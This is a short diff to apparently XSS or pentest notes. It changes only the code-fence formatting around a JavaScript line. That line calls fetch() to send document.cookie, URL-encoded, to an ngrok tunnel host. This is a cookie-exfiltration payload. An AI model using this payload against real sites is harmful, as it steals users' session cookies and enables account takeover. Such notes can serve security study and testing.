@@ -22,6 +22,6 @@ document.createElement("image")
 
 The encodeURIComponent() function encodes a URI by replacing each instance of certain characters by one, two, three, or four escape sequences representing the UTF-8
 
-'''js
+```js
 fetch(`https://ae1c-43.ngrok-free.app?${encodeURIComponent(document.cookie)}`, { method: "get", headers: new Headers({ "ngrok-skip-browser-warning": true }) })
-'''
+```
